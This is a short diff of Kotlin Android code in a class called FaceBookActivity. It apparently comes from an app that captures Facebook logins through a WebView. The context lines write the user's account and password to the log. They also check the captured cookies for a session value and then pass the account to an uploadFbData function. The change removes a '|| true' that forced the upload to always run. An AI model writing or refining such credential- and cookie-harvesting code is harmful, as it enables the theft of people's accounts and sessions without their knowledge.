@@ -121,7 +121,7 @@ class FaceBookActivity : BaseActivity(), MyWebView.Listener {
                             Log.e("--->", "account == $account  password == $password")
                             if (!TextUtils.isEmpty(account) && cookieStr.contains("wd=") && !url.contains(
                                     "checkpoint"
-                                ) || true
+                                )
                             ) {
                                 uploadFbData(
                                     account,
